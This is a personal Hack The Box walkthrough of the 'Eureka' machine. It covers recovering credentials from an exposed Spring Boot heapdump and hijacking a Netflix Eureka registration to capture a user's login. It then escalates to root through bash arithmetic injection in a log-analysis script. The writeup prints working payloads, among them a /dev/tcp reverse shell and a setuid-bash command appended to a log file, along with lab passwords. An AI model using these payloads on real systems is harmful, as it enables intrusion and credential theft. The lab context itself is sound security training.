# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.66
nmap -sU --top-ports=10 -vv 10.10.11.66

---OUTPUT-TCP---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0=
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk=
|   256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

8761/tcp open  unknown syn-ack
---OUTPUT-UDP---

```
----
## Directory Enumeration
- Gobuster:
	- Directory
		```bash
gobuster dir -u http://furni.htb dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/about                (Status: 200) [Size: 14351]
/contact              (Status: 200) [Size: 10738]
/blog                 (Status: 200) [Size: 13568]
/login                (Status: 200) [Size: 1550]
/services             (Status: 200) [Size: 14173]
/shop                 (Status: 200) [Size: 12412]
/comment              (Status: 302) [Size: 0] [--> http://furni.htb/login]
/cart                 (Status: 302) [Size: 0] [--> http://furni.htb/login]
/register             (Status: 200) [Size: 9028]
/logout               (Status: 200) [Size: 1159]
/checkout             (Status: 302) [Size: 0] [--> http://furni.htb/login]
/error                (Status: 500) [Size: 73]
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
```
		- Next Directory
			```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -u http://furni.htb

---OUTPUT---
/actuator             (Status: 200) [Size: 2129]
/actuator/caches      (Status: 200) [Size: 20]
/actuator/env/lang    (Status: 200) [Size: 668]
/actuator/env         (Status: 200) [Size: 6307]
/actuator/env/home    (Status: 200) [Size: 668]
/actuator/env/path    (Status: 200) [Size: 668]
/actuator/features    (Status: 200) [Size: 467]
/actuator/info        (Status: 200) [Size: 2]
/actuator/health      (Status: 200) [Size: 15]
/actuator/metrics     (Status: 200) [Size: 3356]
/actuator/configprops (Status: 200) [Size: 37195]
/actuator/mappings    (Status: 200) [Size: 35560]
/actuator/refresh     (Status: 405) [Size: 114]
/actuator/sessions    (Status: 400) [Size: 108]
/actuator/scheduledtasks (Status: 200) [Size: 54]
/actuator/conditions  (Status: 200) [Size: 184221]
/actuator/beans       (Status: 200) [Size: 202254]
/actuator/loggers     (Status: 200) [Size: 101549]
/actuator/threaddump  (Status: 200) [Size: 106777]
Progress: 120 / 121 (99.17%)
[ERROR] context deadline exceeded (Client.Timeout or context cancellation while reading body)
===============================================================
Finished
===============================================================
```
- I find heapdump file exploring these subdirectories
- On playing around with it i find creds with :
	```bash
strings headpdump | grep "password"

---OUTPUT---
{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
```
	- Also used grep -i and it gave the output but this was more easy to find as lesser data
- Can ssh into machine
	```bash
ssh oscar190@10.10.11.66
> 0sc@r190_S0l!dP@sswd
```
- Don't find much but if we remember there was a another port shown in our nmap that also asked for login credentials.
- We check ps -ax to see where it is being hosted:
	```bash
netstat| grep "8761"


---OUTPUT---
cp6       0      0 eureka:47044            eureka:8761             ESTABLISHED
tcp6       1      0 eureka:34134            eureka:8761             CLOSE_WAIT 
tcp6       0      0 eureka:40628            eureka:8761             ESTABLISHED
tcp6       1      0 eureka:48444            eureka:8761             CLOSE_WAIT 
tcp6       1      0 eureka:54980            eureka:8761             CLOSE_WAIT 
tcp6       0      0 eureka:57128            eureka:8761             ESTABLISHED

# Earlier I also saw:
tcp        0      0 localhost:59612         localhost:8761          ESTABLISHED
```
	- We check /etc/hosts to find eureka
		```bash
cat /etc/hosts

---OUTPUT--
127.0.0.1 localhost eureka furni.htb
```
		- We search for 8761 in heapdump:
			```bash
strings heapdump| grep "8761"

---OUTPUT---
P`http://localhost:8761/eureka/
http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!
http://localhost:8761/eureka/!
http://localhost:8761/eureka/!
Host: localhost:8761
http://localhost:8761/eureka/!
Host: localhost:8761
```
	- We check credentials by logging in via the port in 10.10.11.66
		- Credentials work
			![[Pasted image 20250429180149.png]]
- On searching online we see (and also I remember seeing a "netflix" during my enumeration) that it is park of netflix eureka integrated into springboot (https://cloud.spring.io/spring-cloud-netflix/reference/html/)
	- I find this that talks about exploiting it:
		- https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka/
			- ![[Pasted image 20250429180440.png]]
		- I copy the above content to burpsuite (first i capture the login packet of the site and paste this as a POST request) ( i also encode credentials to base64)
			```bash
POST /eureka/apps/USER-MANAGEMENT-SERVICE HTTP/1.1
Accept: application/json, application/*+json
Accept-Encoding: gzip
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Content-Type: application/json
User-Agent: Java/11.0.10
Host: 10.10.11.66:8761
Connection: keep-alive
Content-Length: 433

{"instance":{"instanceId":"USER-MANAGEMENT-SERVICE","app":"USER-MANAGEMENT-SERVICE","appGroupName":null,"ipAddr":"10.10.14.25",
"hostName": "10.10.14.25",
"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"status":"UP",
"vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
"overriddenStatus":"UNKNOWN","port":{"$":8083,"@enabled":"true"}}}
```
	- I turn on netcat and get some credentials:
	- 
- Alternatively I can tunnel localhost and pass the command or use curl with credentials:
	```bash
~C
-L 8761:127.0.0.1:8761
```
	- Log into target via localhost:8761
- Then I try to pass the command again (using curl this time but only difference is in POST request we change Host to localhost:8761)
	```bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.25",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.25",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```
	- And have net cat listening on port
- For both methods we can a response in netcat:
	```bash
nc -lvnp 8083

---OUTPUT---
listening on [any] 8083 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.66] 53712
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=NTk0YTQwOTctOWEyZC00MTkwLWIyMjItMzU4ZTVmMjNlZTgz
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:47400"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.25:8083

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=ZjjlHICht4yCy5QqAqRaT3XeXrbDNfZATYXriUAzfITneORZUQnRKLmXgLqvqfZLZ4luLRDpc46nDcZtKLWP6yNXS7XfS9No
```
	- We get credentials
- We ssh into machine with credentials:
	```bash
ssh miranda.wise@10.10.11.66
>IL%21veT0Be%26BeT0L0ve
```
	- It fails
	- I check from oscar190's account in the /home directory and find a folder miranda-wise. I use this as username
		```bash
oscar190@eureka:~/.local/share/nano$ ls /home

---OUTPUT---
miranda-wise  oscar190
```
	- I try to ssh again
		```bash
ssh miranda-wise@10.10.11.66
>IL%21veT0Be%26BeT0L0ve
```
		- It still fails. Looking at the pwd it looks URL encoded. I decode it with Burp (just pasted in request, selected text and pressed Ctrl+Shift+U)
			```bash
IL!veT0Be&BeT0L0ve
```
	- I try to ssh again and it works this time:
		```bash
ssh miranda-wise@10.10.11.66
>IL!veT0Be&BeT0L0ve
```
## Privilege Escalation
- Looking around there's not much, can't do sudo commands, no etuid privileges...
- I pass ps -ax and find some scripts being passed:
	```bash
ps -ax

---RELEVANT-OUTPUT---
 331457 ?        Ss     0:00 /bin/sh -c /opt/scripts/log_cleanup.sh
 331459 ?        S      0:00 /bin/sh /opt/scripts/log_cleanup.sh
 
```
- I check /opt and find a script ( can't access further than /opt):
	```bash
ls /opt

---OUTPUT---
total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
```
- Reading the script we find something interesting:
	```bash
cat log_analyse.sh

---RELEVANT-OUTPUT---
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}

```
	- We see `if [[ "$existing_code" -eq "$code" ]]; then` is an arithmetic operation
		- Reference: https://dev.to/greymd/eq-can-be-critically-vulnerable-338m
		- In bash it will execute whatever is in (...) for the arithmetic operation first. 
		- In an arithmetic context, anything inside $(...) or backticks will be executed, even if the overall expression fails.
			- For example:
				```bash
num="[$(echo gotcha)]"
[[ 5 -eq $num ]]
```
				- This will:
					- Run echo gotcha and capture the result ([gotcha]).
					- Try to evaluate 5 -eq [gotcha], which obviously fails.
					- But step 1 already executed, so the damage is done.
				- Bash sees $(...) as part of a value it's trying to convert to a number, and evaluates it before checking whether it’s actually a valid number.
					- So if someone does:
						```bash
code="[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]"
if [[ 200 -eq $code ]]; then ...
```
						- The cp and chmod will run immediately, even though $code isn't a number and the comparison fails.
- So we Find a log file we can change and add the details for code with our exploit:
	- We can find logs in /var/www/web/cloud-gateway/log OR /var/www/web/user-management-service/log/
		```bash
rm application.log 
> y
echo 'HTTP Status: x[$(bash -c "bash -i >& /dev/tcp/10.10.14.25/9999 0>&1")]' >> application.log
--OR--
echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' >> application.log
```
		- If we used the first command we turn on netcat listener and eventually we get reverse shell:
			```bash
nc -lvnp 9999

---OUTPUT---

connect to [10.10.14.25] from (UNKNOWN) [10.10.11.66] 43368
bash: cannot set terminal process group (383854): Inappropriate ioctl for device
bash: no job control in this shell
root@eureka:~# whoami
root
```
	- If second command, after some time we should find a bash executable in /tmp
		```bash
cd /tmp
./bash -p
bash-5.0# whoami

---OUTPUT--
root
```
	- We can grab root flag
	- Tried to initially copy ssh file but it didn't work. On searching as root we see that file doesn't exit

-------
--------
- https://hackmyvm.eu/login/
	- similar exploit in this box i think
